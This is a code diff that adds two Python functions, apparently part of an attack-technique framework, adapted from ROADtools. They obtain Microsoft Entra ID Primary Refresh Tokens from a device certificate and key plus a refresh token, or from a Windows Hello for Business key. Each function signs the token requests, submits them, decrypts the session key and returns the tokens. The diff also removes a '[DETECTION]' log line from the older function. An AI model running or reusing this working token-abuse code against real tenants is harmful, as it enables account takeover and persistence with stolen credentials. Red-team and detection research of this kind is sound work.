@@ -398,6 +398,224 @@ def get_prt_with_refresh_token(params):
 	logging.info(f"Successfully obtained PRT for device {device_id}")
 	return output
 
+
+def get_prt_with_refresh_token_v2(params):
+	"""
+	Request a Primary Refresh Token (PRT) using device credentials + refresh token.
+
+	v2.0 counterpart of get_prt_with_refresh_token: hits ``/oauth2/v2.0/token``
+	and the signed request carries ``prt_protocol_version=3.0`` instead of
+	``windows_api_version``. Under the hood this is ROADtools' PRT protocol v3
+	(get_prt_with_refresh_token_v3).
+
+	Uses a devices certificate and private key
+	plus a user's refresh token to authenticate and obtain a PRT + session key.
+
+	Based on ROADtools deviceauth.py:
+	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L988
+
+	"""
+	logging.info("Running the request_prt technique")
+
+	# Load device credentials
+	key_path = _artifact_read_path(params, params.get("key_path"))
+	cert_path = _artifact_read_path(params, params.get("cert_path"))
+	session = params.get("session", "nosession")
+	tenant_id = params.get("tenant_id", "common")
+	refresh_token = params.get("refresh_token")
+
+	if not key_path or not cert_path:
+		logging.error("key_path and cert_path parameters are required")
+		return
+
+	# Load private key
+	try:
+		with open(key_path, "rb") as f:
+			private_key_pem = f.read()
+		private_key = serialization.load_pem_private_key(
+			private_key_pem,
+			password=None,
+			backend=default_backend()
+		)
+	except Exception as e:
+		logging.error(f"Failed to load private key from {key_path}: {e}")
+		return
+
+	# Load certificate
+	try:
+		with open(cert_path, "rb") as f:
+			cert_data = f.read()
+		try:
+			certificate = x509.load_der_x509_certificate(cert_data, default_backend())
+		except:
+			logging.warning("Failed to parse certificate with cryptography, continuing with binary data")
+			certificate = None
+	except Exception as e:
+		logging.error(f"Failed to load certificate from {cert_path}: {e}")
+		return
+
+	# Extract device ID from certificate subject
+	device_id = None
+	if certificate:
+		try:
+			for attr in certificate.subject:
+				if attr.oid == x509.oid.NameOID.COMMON_NAME:
+					device_id = attr.value
+					break
+		except Exception as e:
+			logging.warning(f"Failed to extract device ID from certificate: {e}")
+
+	if not device_id:
+		logging.error("Could not extract device ID from certificate subject")
+		return
+
+	logging.info(f"Using device {device_id} to request PRT")
+
+	# STEP 1: Get nonce via srv_challenge grant type
+	# Following ROADtools approach
+	logging.debug("Step 1: Requesting nonce via srv_challenge")
+
+	nonce_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
+	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
+	headers = {
+		"Content-Type": "application/x-www-form-urlencoded",
+		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+	}
+
+	# AAD Broker Plugin client ID
+	aad_broker_client_id = "29d9ed98-a469-4536-ade2-f981bc1d605e"
+
+	# Request nonce
+	nonce_body = {
+		"grant_type": "srv_challenge",
+		"windows_api_version": "2.0",
+		"client_id": aad_broker_client_id,
+	}
+
+	try:
+		nonce_response = requests.post(nonce_endpoint, headers=headers, data=nonce_body, timeout=10)
+		if nonce_response.status_code != 200:
+			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
+			logging.debug(f"Response: {nonce_response.text[:200]}")
+			return
+
+		nonce_data = nonce_response.json()
+		nonce = nonce_data.get("Nonce")
+		if not nonce:
+			logging.error(f"No nonce received from srv_challenge")
+			return
+
+		logging.debug(f"Nonce obtained: {nonce[:20]}...")
+
+	except Exception as e:
+		logging.error(f"Exception during srv_challenge: {e}")
+		return
+
+	# STEP 2: Create signed JWT with device certificate
+	logging.debug("Step 2: Creating signed JWT with refresh token + device certificate")
+
+	try:
+		# JWT payload per ROADtools get_prt_with_refresh_token_v3
+		jwt_payload = {
+			"client_id": aad_broker_client_id,
+			"request_nonce": nonce,
+			"scope": "openid aza",
+			"grant_type": "refresh_token",
+			"refresh_token": refresh_token,  # User's refresh token - REQUIRED
+		}
+
+		# Include certificate in x5c header (base64-encoded, NOT as array for this flow)
+		cert_b64 = base64.b64encode(cert_data).decode()
+
+		# Sign JWT with device private key using RS256. The v3 flow drops the
+		# kdf_ver header the v1 flow sends.
+		jwt_token = jwt.encode(
+			jwt_payload,
+			private_key,
+			algorithm="RS256",
+			headers={
+				"x5c": cert_b64,
+			}
+		)
+
+		logging.debug(f"Device JWT created: {jwt_token[:80]}...")
+
+	except Exception as e:
+		logging.error(f"Failed to create device JWT: {e}")
+		return
+
+	# STEP 3: Submit signed JWT to get PRT
+	logging.debug("Step 3: Submitting JWT to obtain PRT (refresh_token upgrade)")
+
+	prt_body = {
+		"prt_protocol_version": "3.0",
+		"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
+		"request": jwt_token,
+		"client_info": "1",
+	}
+
+	try:
+		prt_response = requests.post(token_endpoint, headers=headers, data=prt_body, timeout=10)
+	except Exception as e:
+		logging.error(f"Exception during PRT request: {e}")
+		return
+
+	# Check response
+	if prt_response.status_code not in (200, 201):
+		logging.error(f"PRT request failed: {prt_response.status_code}")
+		try:
+			error_response = prt_response.json()
+			logging.error(f"Error: {error_response.get('error')}")
+			logging.error(f"Error description: {error_response.get('error_description')}")
+			logging.debug(f"Full response: {prt_response.text[:500]}")
+		except:
+			logging.error(f"Response: {prt_response.text[:200]}")
+		return
+
+	try:
+		result = prt_response.json()
+	except Exception as e:
+		logging.error(f"Failed to parse PRT response: {e}")
+		return
+
+	# Extract PRT components from response
+	session_key_jwe = result.get("session_key_jwe")
+	tgt_ad = result.get("tgt_ad")
+	tgt_cloud = result.get("tgt_cloud")
+	refresh_token = result.get("refresh_token")
+
+	if not session_key_jwe:
+		logging.error(f"PRT response did not include session_key_jwe")
+		logging.debug(f"Response keys: {list(result.keys())}")
+		return
+
+	# Decrypt session_key_jwe to get the actual session key for later use
+	logging.debug("Decrypting session key for storage")
+	try:
+		session_key = _decrypt_jwe_with_private_key(session_key_jwe, private_key)
+		if not session_key:
+			logging.error("Failed to decrypt session key from PRT response")
+			return
+		logging.debug("   Session key decrypted and ready for storage")
+	except Exception as e:
+		logging.error(f"Failed to decrypt session key: {e}")
+		return
+
+	output = {
+		"device_id": device_id,
+		"session_key": base64.b64encode(session_key).decode('utf-8'),
+		"tgt_ad": tgt_ad,
+		"tgt_cloud": tgt_cloud,
+		"refresh_token": refresh_token,
+		"id_token": result.get("id_token"),
+		"obtained_at": datetime.utcnow().isoformat(),
+		"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
+	}
+
+	logging.info(f"Successfully obtained PRT for device {device_id}")
+	return output
+
+
 def _calculate_derived_key_v2(session_key, context, jwtbody):
 	"""
 	Derive a key from PRT session key using context and JWT body.
@@ -1255,5 +1473,287 @@ def get_prt_with_whfb_key(params):
 	}
 
 	logging.info(f" Successfully obtained PRT using Windows Hello for Business key")
-	logging.info(f"[DETECTION] Obtained PRT using Windows Hello for Business key for {username}")
+	return output
+
+
+def get_prt_with_whfb_key_v2(params):
+	"""
+	Acquire a Primary Refresh Token (PRT) using a registered Windows Hello for Business key.
+
+	v2.0 counterpart of get_prt_with_whfb_key: hits ``/oauth2/v2.0/token`` and
+	the signed request carries ``prt_protocol_version=3.0`` instead of
+	``windows_api_version``. Under the hood this is ROADtools' PRT protocol v3
+	(get_prt_with_hello_key_v3).
+
+	Uses the Windows Hello for Business private key (registered in create_whfb_key) to create
+	an assertion, which is then used to authenticate and obtain a PRT from Entra ID.
+
+	Based on ROADtools get_prt_with_hello_key and create_hello_prt_assertion:
+	https://github.com/dirkjanm/ROADtools/blob/master/roadlib/roadtools/roadlib/deviceauth.py#L242
+
+	Parameters:
+		whfb_key_path: Path to saved Windows Hello private key file
+		key_path: Path to device private key (for signing token request)
+		cert_path: Path to device certificate (for token request headers)
+		username: Username for JWT assertion (typically user@domain)
+		tenant_id: Tenant ID
+
+	Returns:
+		Dictionary with PRT and session key details
+	"""
+	logging.info("Running the get_prt_with_whfb_key_v2 technique")
+
+	# Load parameters
+	whfb_key_path = _artifact_read_path(params, params.get("whfb_key_path"))
+	key_path = _artifact_read_path(params, params.get("key_path"))
+	cert_path = _artifact_read_path(params, params.get("cert_path"))
+	username = params.get("username")
+	tenant_id = params.get("tenant_id", "common")
+
+	if not all([whfb_key_path, key_path, cert_path, username]):
+		logging.error("whfb_key_path, key_path, cert_path, and username parameters are required")
+		return
+
+	# Step 1: Load Windows Hello for Business private key
+	logging.debug("Step 1: Loading Windows Hello for Business private key")
+	try:
+		with open(whfb_key_path, "rb") as f:
+			whfb_key_pem = f.read()
+		whfb_key = serialization.load_pem_private_key(
+			whfb_key_pem,
+			password=None,
+			backend=default_backend()
+		)
+		logging.debug("   Loaded Windows Hello private key")
+	except Exception as e:
+		logging.error(f"Failed to load Windows Hello key: {e}")
+		return
+
+	# Step 2: Load device private key and certificate
+	logging.debug("Step 2: Loading device private key and certificate")
+	try:
+		with open(key_path, "rb") as f:
+			device_key_pem = f.read()
+		device_key = serialization.load_pem_private_key(
+			device_key_pem,
+			password=None,
+			backend=default_backend()
+		)
+
+		with open(cert_path, "rb") as f:
+			cert_data = f.read()
+		try:
+			device_cert = x509.load_der_x509_certificate(cert_data, default_backend())
+		except:
+			logging.warning("Failed to parse device certificate with cryptography, will use binary data")
+			device_cert = None
+
+		logging.debug("   Loaded device key and certificate")
+	except Exception as e:
+		logging.error(f"Failed to load device credentials: {e}")
+		return
+
+	# Step 3: Calculate Windows Hello key ID (kid)
+	logging.debug("Step 3: Calculating Windows Hello key identifier")
+	try:
+		whfb_key_blob = _build_transport_key_blob(whfb_key.public_key())
+		whfb_key_blob_bytes = base64.b64decode(whfb_key_blob)
+		kid_hash = hashes.Hash(hashes.SHA256(), backend=default_backend())
+		kid_hash.update(whfb_key_blob_bytes)
+		kid = base64.b64encode(kid_hash.finalize()).decode('utf-8')
+		logging.debug(f"   Calculated Windows Hello kid: {kid[:20]}...")
+	except Exception as e:
+		logging.error(f"Failed to calculate key ID: {e}")
+		return
+
+	# Step 4: Request nonce for Windows Hello assertion
+	logging.debug("Step 4: Requesting nonce for Windows Hello assertion (srv_challenge)")
+	nonce_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/token"
+	token_endpoint = f"https://login.microsoftonline.com/{tenant_id}/oauth2/v2.0/token"
+	headers = {
+		"Content-Type": "application/x-www-form-urlencoded",
+		"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+	}
+
+	nonce_body = {
+		"grant_type": "srv_challenge",
+		"windows_api_version": "2.0",
+		"client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",  # Windows Hello client ID
+	}
+
+	try:
+		nonce_response = requests.post(nonce_endpoint, headers=headers, data=nonce_body, timeout=10)
+		if nonce_response.status_code != 200:
+			logging.error(f"srv_challenge failed: {nonce_response.status_code}")
+			return
+
+		nonce_data = nonce_response.json()
+		nonce = nonce_data.get("Nonce")
+		if not nonce:
+			logging.error("No nonce received from srv_challenge")
+			return
+
+		logging.debug(f"   Obtained nonce: {nonce[:20]}...")
+	except Exception as e:
+		logging.error(f"Exception during nonce request: {e}")
+		return
+
+	# Step 5: Create Windows Hello PRT assertion (signed with WHfB key)
+	logging.debug("Step 5: Creating Windows Hello assertion (JWT signed with WHfB key)")
+	try:
+		now = int(time.time())
+		assertion_payload = {
+			"iss": username,
+			"aud": "common",
+			"iat": now - 3600,
+			"exp": now + 3600,
+			"request_nonce": nonce,
+			"scope": "openid aza ugs"
+		}
+
+		assertion_headers = {
+			"kid": kid,
+			"use": "ngc"
+		}
+
+		whfb_assertion = jwt.encode(
+			assertion_payload,
+			whfb_key,
+			algorithm="RS256",
+			headers=assertion_headers
+		)
+
+		logging.debug(f"   Created Windows Hello assertion: {whfb_assertion[:60]}...")
+	except Exception as e:
+		logging.error(f"Failed to create assertion: {e}")
+		return
+
+	# Step 6: Request challenge nonce for device cert signing
+	logging.debug("Step 6: Requesting challenge nonce for device certificate signing")
+	challenge_body = {
+		"grant_type": "srv_challenge",
+		"windows_api_version": "2.0",
+		"client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",
+	}
+
+	try:
+		challenge_response = requests.post(nonce_endpoint, headers=headers, data=challenge_body, timeout=10)
+		if challenge_response.status_code != 200:
+			logging.error(f"Challenge request failed: {challenge_response.status_code}")
+			return
+
+		challenge_data = challenge_response.json()
+		challenge = challenge_data.get("Nonce")
+		if not challenge:
+			logging.error("No challenge nonce received")
+			return
+
+		logging.debug(f"   Obtained challenge: {challenge[:20]}...")
+	except Exception as e:
+		logging.error(f"Exception during challenge request: {e}")
+		return
+
+	# Step 7: Create token request payload and sign with device certificate
+	logging.debug("Step 7: Creating token request signed with device certificate")
+	try:
+		# Build request payload per ROADtools get_prt_with_hello_key_v3
+		request_payload = {
+			"client_id": "38aa3b87-a06d-4817-b275-7a316988d93b",
+			"request_nonce": challenge,
+			"scope": "openid aza offline_access",
+			"group_sids": [],
+			"win_ver": "10.0.19041.868",
+			"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
+			"username": username,
+			"assertion": whfb_assertion
+		}
+
+		# Encode cert for x5c header
+		cert_der = base64.b64encode(cert_data).decode('utf-8')
+
+		# Create JWT signed with device certificate. The v3 flow drops the
+		# kdf_ver header the v1 flow sends.
+		token_headers = {
+			"x5c": cert_der,
+		}
+
+		request_jwt = jwt.encode(
+			request_payload,
+			device_key,
+			algorithm="RS256",
+			headers=token_headers
+		)
+
+		logging.debug(f"   Created signed token request: {request_jwt[:60]}...")
+	except Exception as e:
+		logging.error(f"Failed to create signed request: {e}")
+		return
+
+	# Step 8: Submit token request to obtain PRT
+	logging.debug("Step 8: Submitting token request to obtain PRT")
+	prt_body = {
+		"prt_protocol_version": "3.0",
+		"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer",
+		"request": request_jwt,
+		"client_info": "1",
+	}
+
+	try:
+		prt_response = requests.post(token_endpoint, headers=headers, data=prt_body, timeout=10)
+	except Exception as e:
+		logging.error(f"Exception during PRT request: {e}")
+		return
+
+	if prt_response.status_code not in (200, 201):
+		logging.error(f"PRT request failed: {prt_response.status_code}")
+		try:
+			error_response = prt_response.json()
+			logging.error(f"Error: {error_response.get('error')}")
+			logging.error(f"Error description: {error_response.get('error_description')}")
+		except:
+			logging.error(f"Response: {prt_response.text[:200]}")
+		return
+
+	try:
+		result = prt_response.json()
+	except Exception as e:
+		logging.error(f"Failed to parse PRT response: {e}")
+		return
+
+	# Step 9: Decrypt and save PRT components
+	logging.debug("Step 9: Decrypting session key and saving PRT components")
+	session_key_jwe = result.get("session_key_jwe")
+	tgt_ad = result.get("tgt_ad")
+	tgt_cloud = result.get("tgt_cloud")
+	refresh_token = result.get("refresh_token")
+
+	if not session_key_jwe:
+		logging.error("PRT response did not include session_key_jwe")
+		return
+
+	# Decrypt session_key_jwe to get the actual session key for later use
+	# Note: session_key_jwe is encrypted to the device certificate's public key, not the WHfB key
+	try:
+		session_key = _decrypt_jwe_with_private_key(session_key_jwe, device_key)
+		if not session_key:
+			logging.error("Failed to decrypt session key from PRT response")
+			return
+		logging.debug("   Session key decrypted and ready for storage")
+	except Exception as e:
+		logging.error(f"Failed to decrypt session key: {e}")
+		return
+
+	output = {
+		"device_id": username,
+		"session_key": base64.b64encode(session_key).decode('utf-8'),
+		"tgt_ad": tgt_ad,
+		"tgt_cloud": tgt_cloud,
+		"refresh_token": refresh_token,
+		"id_token": result.get("id_token"),
+		"obtained_at": datetime.utcnow().isoformat(),
+		"expires_at": (datetime.utcnow() + timedelta(hours=1)).isoformat(),
+		"authentication_method": "Windows Hello for Business"
+	}
+
+	logging.info(f" Successfully obtained PRT using Windows Hello for Business key")
 	return output
